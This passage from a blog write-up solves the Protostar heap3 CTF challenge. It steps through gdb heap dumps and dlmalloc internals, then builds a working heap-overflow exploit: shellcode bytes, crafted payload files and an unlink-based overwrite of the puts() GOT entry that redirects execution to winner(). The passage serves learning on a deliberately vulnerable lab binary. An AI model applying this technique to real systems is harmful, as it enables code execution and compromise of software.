0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
</code></pre>

<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
because there&rsquo;s no previous chunk that&rsquo;s free.</p>

<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 2, 0x08048750 in strcpy@plt ()
</code></pre>

<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 2, 0x08048750 in strcpy@plt ()
</code></pre>

<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
the remaining two <code>strcpy()</code>&rsquo;s.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 2, 0x08048750 in strcpy@plt ()
(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x43434343  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
<code>free()</code>. Continue again.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c008) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
second and third chunk are now tied together in a singly-linked list since they are small enough to
be considered fastbins. Continue.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 4, 0x08048790 in puts@plt ()
</code></pre>

<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>

<pre><code>(gdb) c
Continuing.
dynamite failed?

Program exited with code 021.
0x804c000:  Error while running hook_stop:
Cannot access memory at address 0x804c000
</code></pre>

<h2>Crafting the exploit</h2>

<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>

<pre><code>user@protostar:$ objdump -t /opt/protostar/bin/heap3 | grep winner
08048864 g     F .text  00000025              winner
</code></pre>

<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>

<pre><code>mov eax, 0x8048864
call eax
</code></pre>

<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
Let&rsquo;s go back to the unlink statements.</p>

<pre><code>BK = *(P + 12);
FD = *(P + 8);
*(FD + 12) = BK;
*(BK + 8) = FD;
</code></pre>

<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>

<pre><code>user@protostar:$ echo -en "AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0" &gt; /tmp/A
</code></pre>

<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>

<pre><code>user@protostar:$ echo -en "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65" &gt; /tmp/B
</code></pre>

<p>Now we craft the third and final argument. The structure for it will be some padding + some four
bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>

<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
dlmalloc into thinking the next chunk is free.</p>

<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>

<pre><code>if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
</code></pre>

<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>

<pre><code>#define inuse_bit_at_offset(p, s) \
  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)
</code></pre>

<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>

<pre><code>#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))
</code></pre>

<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>

<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
summing to a small number, at least in the way computers represent integers? In non-modular
arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
modular arithmetic, a small integer can be the sum of large numbers that are greater than the
modulus.</p>

<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
simply use <code>0xfffffffc</code> again here.</p>

<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>

<pre><code>user@protostar:/tmp$ echo -en "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08" &gt; /tmp/C
</code></pre>

<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>

<h2>Checking it works</h2>

<p>With the same gdb session as above, run the program with the three arguments.</p>

<pre><code>(gdb) r $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
0x804c000:  Error while running hook_stop:
Cannot access memory at address 0x804c000

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
</code></pre>

<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>

<pre><code>(gdb) c
Continuing.
...

Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p>Examine the GOT entry for <code>puts()</code>.</p>

<pre><code>(gdb) x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
</code></pre>

<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
3583    in common/malloc.c
(gdb) x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c014
</code></pre>

<p>Let the rest of the program run to see <code>winner()</code> is called.</p>

<pre><code>Breakpoint 4, 0x08048790 in puts@plt ()
(gdb) si
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x0804c014 in ?? ()
(gdb) si
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x0804c019 in ?? ()
(gdb) si
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
winner () at heap3/heap3.c:8
8   heap3/heap3.c: No such file or directory.
    in heap3/heap3.c
(gdb) c
Continuing.
that wasn't too bad now, was it? @ 1587442625

Program received signal SIGSEGV, Segmentation fault.
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x0804c01b in ?? ()
</code></pre>

<p>Now let&rsquo;s run it without gdb.</p>

<pre><code>user@protostar:~$ /opt/protostar/bin/./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
that wasn't too bad now, was it? @ 1587443061
Segmentation fault
</code></pre>

<p>Amazing.</p>

<h3>References</h3>

<ul>
<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
</ul>

]]></content>
  </entry>
  
</feed>
